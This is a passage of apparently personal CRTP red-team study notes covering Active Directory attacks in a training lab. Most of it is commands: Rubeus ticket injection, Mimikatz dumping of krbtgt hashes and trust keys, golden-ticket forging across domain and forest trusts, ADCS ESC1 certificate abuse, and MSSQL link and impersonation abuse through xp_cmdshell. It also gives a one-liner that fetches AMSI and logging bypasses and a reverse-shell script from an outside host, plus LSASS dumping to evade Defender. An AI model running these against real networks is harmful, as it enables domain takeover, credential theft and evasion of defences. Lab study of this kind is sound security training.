if you notice there are two dcorp-students1$ accounts, which one will you use? you need to check the SID the first one `"S-1-5-96-0-19"` is well known for the virtual machines that computers are making. however, the second SID `"S-1-5-18"` is known for the original account (not VM). we will take the aes256 of the second one

7. inject an http ticket using Rubeus
```
Rubeus.exe s4u /user:dcorp-student1$ /aes256:<aes256OfWebsvcUser> /impersonateuser:Administrator /msdsspn:http/dorp-mgmt /ptt
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/66281f0f-b992-41ff-9d8a-a271d8b10800)

8. access the administrator
```
winrs -r:dcorp-mgmt cmd
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/c09e5f11-12c4-4795-8ad2-b70dae9b668f)

# Priv Esc - Across Trusts
1. Start a cmd process as svcadmin
```
Rubues.exe asktgt /user:svcadmin /aes:<aes256>
```
2. transfer loader.exe to the svcadmin
```
xcopy loader.exe \\dcorp-dc\C$\Users/Public/Loader.exe /Y
```
Type F in the question

3. run winrs to access the DC
```
winrs -r:dcorp-dc cmd
```
4. configure port forwarding to avoid detection
```
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.1
```
don't forget to run hfs.exe and put safetykatz.exe there
5. run SafetyKatz on memory
```
Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
```
6. extract the trust key
```
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc"'
#OR
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
SafetyKatz.exe "lsadump::dcsync /user:scorp\mcorp$" "exit"
#OR
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/75432d19-2f7b-4c1a-8419-683c0936c6f1)

This is the trust key

7. forge TGS
```
BetterSafetyKatz.exe "Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<SID> /sids:<SIDs> /rc4:<TrustKey> /service:krbtgt /target:moneycorp.local /ticket:C:\AD\Tools\trust_tkt.kirbi" "exit"
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/7ff2dc4a-bf72-4fbb-99ca-1841f1326b17)

8. use Rubeus to reqeust TGS using the ticket that we forged
```
Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi \service:cifs\mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt
klist
dir \\mcorp-dc.moneycorp.local\C$
```
now you can access the shared file of the enterprise admin

# Priv Esc - Child to Parent using krbtgt hash
assume that we have a domain called dollarcorp.moneycorp.local. the dollarcorp is considered the child or son of moneycorp

so, if we assume that we have reached the private Domain Controller in the dollarcorp, but we would like to reach the private Doman Controller in the parent, which is moneycorp.local

Requirements:

1. SID of the enterprise admins group
2. SID of dollarcorp Domain
3. hashKrbtgt

### Explanation
1. Load for the PowerView_dev tool using this command
```
Import-Moudle .\PowerView_dev.ps1
```
2. extract the SID in the Enterprise Admins group located in the domain moneycorp
```
Get-NetGroup -Identity "Enterprise Admins" -Domain moneycorp.local
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/5f400e97-f608-4446-a59e-d72564a26542)

3. extract SID of dollarcorp domain
```
Get-DomainSID
```

4. The third requirement is present in the Domain Controller of the child, which is Dollarcorp. I will access the Domain Controller through this command since I have a user in the Domain Admins group in the dollarcorp domain
```
Enter-PSSession -ComputerName dcorp-dc
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/cfbd5807-2707-4d55-928b-fcd73f9e04eb)

5. extract the hash of krbtgt using the Mimikatz tool using this command
```
.\mimikatz.exe "lsadump::lsa /patch" "exit"
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/99744ce4-4d9c-4609-927f-32b370a8fc36)

Now we have extracted all the requirements that will lead us to the private Domian Controller in the father, which is moneycorp

Now I will open a Powershell session with Administrator privileges

6. I will execute a command using the Mimikatz tool to obtain the TGS in the krbtgt service
```
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /krbtgt:<NTLM> /sid:<SID of Domain Admin> /sids:<SID of Enterprise Admins Group> /ptt
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /ptt
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/e6f16001-70b5-4970-b33b-1721a4a8958c)

7. Tgs of the service, krbtgr will be injected into the memory. To be sure, we will execute this command
```
klist
```
8. Now, in more than one way, we will be able to execute the OS command on the private Domain Controller in the father's moneycorp. We can implement dcsync so that we take the NTLM Hahs of the Administrator located in the father's domain. After that, you set your password PassTheHash and enter the device or execute schuldeing tasks, but these two methods are long and take time in the process. Others are faster

The other way is to download the PsExec tool from the Microsoft website and enter the private Domain Controller in the father's moneycorp via this command

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/71f62423-8d6a-422f-be51-26599e257ba0)

we were able to access the father’s domain through the son’s domain

# Access Resources Across Forest
assume you want to abuse the trust between the erupcorp and moneycorp. Note: you will only be able to access the shared resources

1. you need the trust kee between moneycorp and eurocorp
```
SafetyKatz.exe "lsadump::dcsync /user:dcorp\mcorp$" "exit"
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/1901a2bd-0794-40ec-a4d6-d8e036132cbc)

2. forge TGS
```
BetterSafetyKatz.exe "Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:<SID> /sids:<enterprise admin SID> /rc4:<TrustKey> /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_forest_tkt.kirbi" "exit"
```
3. request a service ticket from the DC of eurocorp
```
Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_forest_tkt.kirbi \service:cifs\eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt
klist
```
4. if you try to access the pc you will not be able
```
dir \\eurocorp-dc.eurocorp.local
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3fb9422d-b653-40a3-8120-cde17b83e11d)

because the trust only in the shared resources

5. enumerate the shares
```
new view \\eurocorp-dc.eurocorp.local
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/63e50a0d-25b2-4ea0-92c3-2ee7a4ea5e85)

6. now try to access the SharedwithDCorp
```
dir \\eurocorp-dc.eurocorp.local\SharedwithDCorp
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/f965943b-a0de-40ca-a601-83ffcac0e599)

# ADCS-ESC1 (Active Directory Certificate Service)
### Requirements
1. `"msPKI-Certificate-Name-Flag"` must have the `"ENROLLEE_SUPPLIES_SUBJECT"` value
2. `"Extended Key Usage"` must have one of the following options: PKINIT Client Authentication, Smart Card Logon, Any Purpose, or no EKU
3. The group you are in must be in the `"Enrollment Right"`
### Enumeration
1. check if the environment using ADCS
```
Certify.exe cas
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/09ca977f-fb84-4978-be2c-abd83cb794ff)

this is the first requirement. Normal users are allowed to enroll the ADCS

2. Enumerate the templates
```
Certify.exe find
Certify.exe find /enrolleeSuppliesSubject
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/99ca2d4a-f55d-4c1e-8051-e2ce1daa0879)

3. Enumerate vulnerable templates
```
Certify.exe find /vulnerable
```
### Exploitation
1. now we are going to abuse the Service Certificate. we will request HTTPS Certificate for the administrator user
```
Certifiy.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/6c39b525-bcda-4623-a6c9-4809a9ebfdfa)

Note: you also can abuse the Service Certificate. we will request HTTPS Certificate for the forest root
```
Certifiy.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/3bd7d457-cd9a-488e-b92d-0f9376b4d499)

2. copy the certificate and save it in pem format
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/232e8980-bedc-4804-afe2-b9383203ec82)

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/10a0a94e-ba00-485d-8b58-e8ae73195a03)

3. use openssl to convert to a PFX format so that we can use this with Rubues
```
openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out C:\AD\Tools\esc1-DA.pfx
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/d6f0c2be-35ec-43cf-9807-d0918212b1ff)

you can specify any password. you will use the password in Rubues

4. using Rubues we will request a TGT ticket for the user administrator using the certificate that we generated.
```
Rubues.exe asktgt /user:administrator /certificate:C:\AD\Tools\esc1-DA.pfx /password:SecretPass@123 /ptt
```
5. klist
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/602c86a5-8d3a-41ad-98b5-4439f7c70a8f)

6. check if you can access the DC
```
winrs -r:dcorp-dc cmd /c set username
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/507f7b30-8f35-44f2-9407-e33def8929c6)

7. you also can list the directory of the DC
```
dir \\dcorp-dc\C$
```
### ADCS - ESC3
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/ff22e39b-272b-4162-b432-9b044489f1d4)

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/36c7dd3c-ed2b-4590-8200-f44d07eb2044)

### ADCS - ESC6
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/bbdbb2bb-2506-4ad5-99a4-97da380a991f)


# Trust Abuse - MSSQL Links
### Load PowerUpSQL
```
Import-Module .\PowerUpSQL-master\PowerUpSQL.ps1
```
### Discovery SQL Servers (SPN Scanning)
```
Get-SQLInstanceDomain -Verbose
```
### Check Accessibility (if you have the privilege to connect to the MSSQL server)
```
Get-SQLConnectionTestThreaded
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/ea3ccbd1-dac0-464c-860e-2d75a9afc2cf)
### Gather Information
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/a72f46b1-dfee-44c1-bf56-8b97ff3125cf)
### Databases link
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/cc3d21f8-7af8-45a9-9eee-2893e57c40b7)

you as an attacker if you have public access to `"DB - A"` and you would have dbuser user access on `"DB - B"` and you would have sa user access on `"DB - C"`
### Search database Links
```
Get-SQLServerLink -Instance dcorp-mssql -Verbose
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/a188fcb8-cc46-42c2-b7da-6c6c8c00d9ca)

`"DatabaseLinkID"` is 0 means the current DB.

if you check the second part we will see the `"DatabaseLinkID"` is 1 means there is a link. there is a link between dcorp-mssql and DCORP-SQL1

check `"is_data_Access_enabled"` if the value is true you can run a query to retrieve more links
```
select * from openquery("dcorp-sql1",'select * from master..sysservers')
```
### Another way to check the DBs links using GUI tool `heidisql`

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/f60c1e4f-c618-4600-8c7f-3139c292f56e)

click on query and run the following command
```
select * from master..sysservers
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/53e49bb0-c98a-4d3d-8a59-cf12aaa735a4)

### the best way to check the DBs links using LinkCrawl tool. it will dig down until reach the last link
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/4aa3c4c0-71ce-4bdb-9355-91ead8065098)

### when you reach the sysadmin you need to try to run command there
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/5f3b9a1e-d2fb-476c-8875-c8bc6e19aa5c)

1. run a query in all DBs
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xpcmdshell 'cmd /c set username'"
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/46126c7f-b5a6-44b1-b6db-6599a7ad240e)

2. we need to know where it is going to be executed (mostly in the admin database)

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/59233ef1-fb3c-478e-a854-742d9ca8e046)

3. you need to check the `CustomQuery`
4. get a reverse shell. start a listener
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/c93ef71c-abc4-41a4-b5a0-41e6fb21bf7c)

5. make sure that your local web server is running `hfs` then run the following command
   
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/7661cc36-caef-40dd-b84b-ec427b6c4e10)
```
Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query 'exec master..xpcmdshell ''powershell -c "iex (iwr -UseBasicParsing http://172.16.100.1/sbloggingbypass.txt);iex (iwr -UseBasicParsing http://172.16.100.1/amsibypass.txt); iex (iwr -UseBasicParsing http://172.16.100.1/Invoke-PowerShellTcpEx.ps1)"''' -QueryTarget eu-sql1
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2588853c-46a4-49be-ab13-801402d5f593)


# MSSQL Impersonate
### Check if the current user has access to the MSSQL service on another computer
```
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/c9e2f10d-92a6-4290-9f76-0306a3499ddb)

as we can see our user `"pastudent131"` has access to MSSQL service on a different computer `"UFC-SQLDev.us.funcorp.local"`

But the problem is that our private user does not have SysAdmin privileges, so we cannot execute commands on the system that runs MSSQL Service in order to get Reverse Shell.
### Now we will see which users we can try to impersonate
```
Get-SQLServerLinkCrawl -Instance <INSTANCE> -Verbose -Query 'SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = ''IMPERSONATE'''
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/03f01ad2-be06-4802-b56f-7f5e9d9ef07c)

as we can see. we can Impersonate two users who are `"sa"` & `"dbuser"` but we don't know which user has sysadmin privilege

therefore, we will execute a command that will show us which user has sysadmin permission
```
Invoke-SQLAuditPrivImpersonateLogin -Instance ufc-sqldev -Verbose -Debug -Exploit
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/4085fde2-3f94-41dc-9bef-097a2d544bc4)

If we notice that it's mentioned, any user present in the RDPUsers group can impersonate the user dbuser, but he does not have sysadmin privileges.

The dbuser user can impersonate the sa user and has SysAdmin privileges

1. Impersonate `"dbuser"` then we will impersonate `"sa"` user
We will execute this command so that the dbuser user will impersonate us, then the sa user will execute the whoami command on the ufc-sqldev device.
```
Get-SQLQuery -Verbose -instance ufc-sqldev -Query "EXECUTE AS LOGIN = 'dbuser';EXECUTE AS LOGIN = 'sa';exec xp_cmdshell 'whoami' "  -User USFUN\pastudent131
```
![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/5f88f3f4-09a3-4b1c-bd45-cd4dc36f446d)

Cool!!

3. Now I will open the http server and transfer the Invoke-PowerShellTcp script to get Reverse Shell, and I will start eavesdropping using netcat.

![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/9b25092c-4f0a-4fe8-be12-5d99b9bb354e)


# EDR - MDE (Microsoft Defender Endpoint) Bypass
### Credential Extraction - MiniDumpDotNet
[MiniDumpDotNet](https://github.com/WhiteOakSecurity/MiniDumpDotNet)
```
.\minidumpdotnet.exe <LSASS PID> <minidump file>
```
### check if it is detected by windows defender using DefenderCheck
```
.\DefenderCheck.exe C:\AD\Tools\minidumpdotnet.exe
```

### Learning Objective 23
check the LabManual page number 122
